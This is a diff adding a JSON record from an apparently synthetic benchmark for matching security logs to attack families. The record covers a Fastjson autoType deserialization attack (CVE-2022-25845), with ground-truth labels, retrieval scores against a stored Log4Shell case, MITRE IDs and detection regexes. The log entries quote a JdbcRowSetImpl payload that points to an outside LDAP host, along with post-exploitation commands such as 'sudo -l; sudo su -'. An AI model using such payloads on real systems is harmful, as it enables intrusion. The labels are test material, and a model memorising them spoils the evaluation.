@@ -1,0 +1,199 @@
+{
+ "unit": 1062,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Fastjson autoType 反序列化远程加载 (CVE-2022-25845)",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-23 16:15:01",
+   "source": "waf",
+   "log_id": "WAF0356964",
+   "content": "/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (",
+   "event_id": "1062-WAF0356964"
+  },
+  {
+   "timestamp": "2026-06-23 16:15:03",
+   "source": "web",
+   "log_id": "WEB0359287",
+   "content": "/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (",
+   "event_id": "1062-WEB0359287"
+  },
+  {
+   "timestamp": "2026-06-23 16:15:04",
+   "source": "rasp",
+   "log_id": "RASP0394945",
+   "content": "https://app-java-179.ops-corp.com/api/v2/order/submit {\"autoType\": \"JdbcRowSetImpl\", \"jndi\": \"ldap://10.20.7.3",
+   "event_id": "1062-RASP0394945"
+  },
+  {
+   "timestamp": "2026-06-23 16:16:36",
+   "source": "hids",
+   "log_id": "HID0386847",
+   "content": "id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/app/order-service.jar",
+   "event_id": "1062-HID0386847"
+  },
+  {
+   "timestamp": "2026-06-23 16:17:36",
+   "source": "hids",
+   "log_id": "HID0386852",
+   "content": "sudo -l; sudo su - sudo sudo -l; sudo su - <== /bin/bash -c 'sudo -l; sudo su -' <== java -jar /opt/app/o",
+   "event_id": "1062-HID0386852"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 2,
+   "detected_steps": 2,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 2,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S2",
+     "action_id": "log4shell_app_jndi_lookup",
+     "label": "应用侧 JNDI 解析并回连",
+     "generic": true,
+     "event_ids": [
+      "1062-RASP0394945"
+     ],
+     "sources": [
+      "rasp"
+     ],
+     "aligned_event_id": "1062-RASP0394945",
+     "detections": [
+      {
+       "event_id": "1062-RASP0394945",
+       "source": "rasp",
+       "timestamp": "2026-06-23 16:15:04"
+      }
+     ]
+    },
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "generic": true,
+     "event_ids": [
+      "1062-HID0386852"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1062-HID0386852",
+     "detections": [
+      {
+       "event_id": "1062-HID0386852",
+       "source": "hids",
+       "timestamp": "2026-06-23 16:17:36"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 8,
+   "keyword_details": [
+    "probe +4: \\\"jndi\\\"\\s*:\\s*\\\"ldap://",
+    "probe +4: java(?:\\.exe)?\\s+-jar\\s+/opt/app/"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1"
+   ],
+   "before_steps": [
+    "S1"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+    "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "反序列化回显"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 2,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S2",
+    "label": "应用侧 JNDI 解析并回连",
+    "sources": [
+     "rasp"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1062-RASP0394945"
+    ]
+   },
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1062-HID0386852"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 8,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
